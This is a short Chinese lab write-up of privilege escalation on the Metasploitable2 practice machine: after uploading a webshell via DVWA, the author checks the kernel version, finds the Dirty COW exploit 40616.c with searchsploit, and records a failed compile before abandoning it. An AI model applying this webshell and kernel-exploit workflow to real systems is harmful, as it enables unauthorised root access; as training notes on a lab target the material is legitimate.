## metasploit_table2提权

2019-5-15

通过dvwa上传了webshell文件

蚁剑连过去，`uname -a` 查看内核版本信息

```
当前路径: /var/www/dvwa/hackable/uploads
磁盘列表: /
系统信息: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
当前用户: www-data
(www-data:/var/www/dvwa/hackable/uploads) $ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

kali `searchsploit privilege | grep linux  | grep 2.6`搜索提权exp

搜到很多exp，这里先试试`exploits/linux/local/40616.c`

```
Linux Kernel 2.6.22 < 3.9 (x86/x64)
'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)             exploits/linux/local/40616.c
```

打开文件，注释里有使用说明和条件要求

```c
//40616.c
/*........
* (un)comment correct payload first (x86 or x64)!
*
* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
....*/
```

根据要求，i686为32位机器，注释掉了64位的payload，取消注释32位的payload，然后上传上去

```shell
(www-data:/var/www/dvwa/hackable/uploads) $ gcc 40616.c -o cowroot -pthread
40616.c: In function 'procselfmemThread':
40616.c:101: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast
40616.c: In function 'main':
40616.c:144: error: invalid use of undefined type 'struct stat'
40616.c:146: error: invalid use of undefined type 'struct stat'
40616.c:147: error: invalid use of undefined type 'struct stat'
40616.c:150: error: invalid use of undefined type 'struct stat'
```

emmm，加上缺少的头文件还是提权失败，换个exp



